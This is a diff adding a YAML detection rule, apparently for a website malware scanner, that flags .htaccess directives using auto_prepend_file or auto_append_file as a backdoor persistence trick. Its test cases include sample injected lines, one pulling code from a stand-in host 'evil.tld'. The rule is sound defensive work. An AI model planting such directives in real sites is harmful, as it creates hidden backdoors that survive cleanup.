@@ -1,0 +1,18 @@
+id: lw:0014
+kind: regex
+target: htaccess
+pattern: 'php_value\s+auto_(prepend|append)_file\s+\S'
+flags: i
+sql_like: null
+tier: infected
+category: backdoor
+name: .htaccess auto_prepend_file/auto_append_file injection
+description: An .htaccess directive that forces PHP to silently include an extra file (often a hidden backdoor) on every request via auto_prepend_file/auto_append_file — a common persistence mechanism that survives cleanup of the visible malware files.
+common_strings: []
+tests:
+  match:
+    - "php_value auto_prepend_file /tmp/.sess_data.ico"
+    - "php_value auto_append_file \"http://evil.tld/inject.txt\""
+  no_match:
+    - "php_value memory_limit 256M"
+    - "php_value upload_max_filesize 64M"
